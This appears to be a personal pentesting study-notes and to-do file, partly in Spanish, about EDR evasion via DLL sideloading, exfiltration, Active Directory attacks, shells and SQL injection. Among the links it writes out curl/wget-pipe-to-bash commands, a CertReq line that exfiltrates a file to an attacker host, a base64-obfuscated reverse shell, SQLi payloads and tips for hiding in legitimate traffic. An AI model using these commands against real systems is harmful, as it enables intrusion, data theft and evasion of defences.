# SSH 
Explain better how to generate keys with ssh-keygen & how public keys work & how to copy .pub to authorized_keys to make it work


---

# Evasion
Research _DLL Sideloading_ and _DLL Proxying_.
¿Es usar una DLL maliciosa que hace de proxy hacia la legítima? Lo puedes ocultar en una aplicación legítima que establece conexiones hacia Internet (p.ej., Discord). Otros ejemplos: apps de VPN, o apps de AD que establece consultas legítimas vía LDAP, Kerberos...
OPSEC: no spawnees nuevos procesos desde ese, mejor condensar toda tu actividad en la memoria del proceso.
Initial Access -> Ejecutar todo dentro de la memoria de un proceso comprometido
Los LOLBins han muerto salvo que hayan sido descubiertos, ahora son detectados por todos los vendors //// salvo que sean nuevos, siempre son detectados
Movimiento lateral -> 
EDR -> cuadrante mágico de Gardner
La protección del endpoint (EDR) llega hasta donde llega y tráfico en protocolos legítimos no protege


---
---

# Potatoes
![[Pasted image 20260425125807.png]]

# API Pentesting


https://antzrm.github.io/hacking-notes/enumeration/web-technologies/php/#bypass-disable_functions -> explain better, try with HTB Hospital if possible
Add also https://www.kali.org/tools/weevely/

# Data Exfiltration
Exfiltrar info por WhatsApp Web, mejor que los capados Drive, WeTransfer, etc. porque WhatsApp va PTP point to point y no se sabe qué se está exfiltrando (research more about it)

# Join SQLite from two different sections or add a link to each other in order to be found all the info related to sqlite easily

MKDocs/Obsidian -> Password Cracking -> [Kaonashi](https://github.com/kaonashi-passwords/Kaonashi) / [CUPP](https://github.com/Mebus/cupp)

File Transfers -> do not touch disk      `curl https://test.com/file.sh | bash`         `wget -q -O - https://... | bash`

LOLBAS -> `CertReq -Post -config http://$LHOST:$LPORT/ C:\Users\file_WE_WANT_TO_EXFILTRATE.txt  # lhost/lport are from our attacking machine` 

Shortcut files (scf, lnk, url)  -> add here the pieces from others sections

URL
![[Pasted image 20250910003939.png]]


# Proxying Tools > Add to Tunneling and portfwd

## Proxychains
We should also enable `Quiet Mode` to reduce noise by un-commenting `quiet_mode` on `/etc/proxychains.conf`
## Nmap
```shell-session
nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
```
## Metasploit
```shell-session
msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080
```


AD > Password > DMSA, GMSA, LAPS, Shadow Credentials, Spraying

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-dmsa/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-dmsa/)

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/)

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/)

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-shadow-credentials/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-shadow-credentials/)

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-spraying/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-spraying/)



PS > Add info from [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/powershell-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/powershell-cheatsheet/) and consider links to AV Evasion for certain scripts/assembly

Cherry/MKDocs > Shells > Bind shells > add them all together from [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)

Revshells > just the link [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)


Azure AD > Access and Tokens [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-access-and-token/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-access-and-token/)

Enumerate [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-enumeration/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-enumeration/)

C2 > Cobalt Strike [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-enumeration/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-enumeration/)

Docker > from Cgroup and also Breaking Out sections [https://swisskyrepo.github.io/InternalAllTheThings/containers/docker/#breaking-out-of-docker-via-runc](https://swisskyrepo.github.io/InternalAllTheThings/containers/docker/#breaking-out-of-docker-via-runc)

Kubernetes [https://swisskyrepo.github.io/InternalAllTheThings/containers/kubernetes/](https://swisskyrepo.github.io/InternalAllTheThings/containers/kubernetes/)

MSSQL > Check all info and add stuff missing / complimentary to my existent MKDocs

[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-audit-checks/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-audit-checks/)

[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-command-execution/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-command-execution/)

[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-credentials/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-credentials/)

[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/)

[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-linked-database/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-linked-database/)


# Log4j
https://github.com/gkhns/Unified-HTB-Tier-2-
https://github.com/veracode-research/rogue-jndi

# Revshell
`bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}`



# Shells
**When we echo things->** `echo -n` to not include break line

# MongoDB
```sh
# CAREFUL, case sensitive
db.<collection>.find().forEach(printjson)
db.<collection>.find(name:"administrator")
db.admin.update({"_id": ObjectId("xxx")}, {$set:{"x_shadow":"$HASH"}});
# To confirm update
db.admin.find({"_id": ObjectId("xxx")});
```

# Password Cracking > Generate Hashes
https://linux.die.net/man/1/mkpasswd
`mkpasswd -m sha-512 admin`


# Windows > Compilation
## How to build self-contained executables
https://ericzimmerman.github.io/#!selfcontained.md

# Path Traversal
add nginx conf files 
`/etc/nginx/nginx.conf`
`/etc/nginx/sites-available/default`


Quick tips SQLi (HIGHLIGHT THIS)
' OR '1'='1
abc"...
abc)...
abc')...
abc")...
Try all this combinations with UNION, BOOLEAN, ETC. -> FOR EXAMPLE
abc') order by 1 -- -

# Passwords > Windows (NTLM)
https://hashmob.net/hashlists/info/4169